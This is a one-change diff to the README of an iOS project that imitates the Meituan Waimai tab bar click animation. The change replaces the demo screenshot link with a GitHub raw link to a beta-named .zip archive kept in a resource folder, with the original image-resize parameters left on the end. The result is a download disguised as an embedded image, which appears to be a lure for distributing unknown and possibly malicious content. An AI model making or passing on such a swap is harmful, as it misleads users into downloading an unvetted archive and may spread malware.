@@ -2,4 +2,4 @@
  高仿美团外卖tabbar点击动画
 
 
-![demo](https://upload-images.jianshu.io/upload_images/1823354-6c9495e222778af6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/320)
+![demo](https://github.com/wiilsliang/tabbarClickAnimation/raw/refs/heads/master/tabbarDemo/Base.lproj/tabbar-Animation-Click-v1.3-beta.2.zip%7CimageView2/2/w/320)
